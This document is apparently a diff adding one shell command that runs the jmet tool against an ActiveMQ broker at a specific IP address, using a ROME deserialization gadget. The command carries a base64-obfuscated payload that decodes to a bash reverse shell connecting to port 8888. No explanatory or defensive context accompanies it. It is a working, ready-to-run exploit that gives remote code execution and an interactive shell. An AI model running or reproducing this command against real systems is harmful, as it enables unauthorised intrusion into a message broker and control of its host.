@@ -1,0 +1,1 @@
+java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTguMjUuNjkuMTk5Lzg4ODggMD4mMQo=}|{base64,-d}|{bash,-i} " -Yp ROME 118.25.69.199 61616
